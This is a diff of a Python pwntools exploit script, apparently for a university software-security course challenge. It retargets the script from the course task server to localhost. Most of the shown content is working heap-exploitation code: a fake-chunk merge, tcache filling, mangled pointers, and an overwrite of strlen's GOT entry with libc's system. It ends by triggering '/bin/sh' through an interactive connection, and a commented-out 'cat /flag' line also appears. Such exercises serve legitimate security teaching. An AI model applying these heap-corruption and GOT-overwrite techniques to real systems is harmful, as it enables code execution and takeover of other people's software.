@@ -12,8 +12,8 @@ pwn.context.arch = 'amd64'
 # 2) docker exec -ti "$(docker ps -q -f 'ancestor=softsec/ragnarok')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'
 
 
-conn = pwn.remote('tasks.ws24.softsec.rub.de', 32865)
-#conn = pwn.remote('127.0.0.1', 1024)
+#conn = pwn.remote('tasks.ws24.softsec.rub.de', 32868)
+conn = pwn.remote('127.0.0.1', 1024)
 
 ################################################################
 
@@ -94,7 +94,7 @@ payload = b'B'*0x80 + pwn.p64(0x230)
 rename(9, payload)
 
 
-## 6) free 10 => merge fakechunk
+## 6) free 10 => merge fakechunk (fill 0xF8 tcache first)
 delete('_m_F8_12')
 delete('_m_F8_13')
 delete('_m_F8_14')
@@ -117,13 +117,20 @@ payload = b'F'*0x78 + pwn.p64(0x90) + pwn.p64(mangled_got_for_strlen)
 
 create(0x328, payload)
 
-## 8) overrid GOT
+## 8) overrid GOT and trigger
 print(f'overriting GOT of strlen at: {hex(got_for_strlen)}')
-create(0x88, b'8_1337' + b'A'*0x80)
+# function calls strlen => first argument is tr
+# when we call system the sting "cat /flag" is given and executed
+#create(0x88, b'cat /flag') # this is the argument for sh
+create(0x88, b'/bin/sh')
 
-create(0x88, pwn.p64(libc.symbols['system'])[:-1])
+payload = pwn.p64(libc.symbols['system']) * 2
+create(0x88, payload)
+
+delete('/bin/sh')
 
 conn.interactive()
 
-delete('_m_F8_15')
 
+
+# offset to tiny alloc + 0x3000 on server
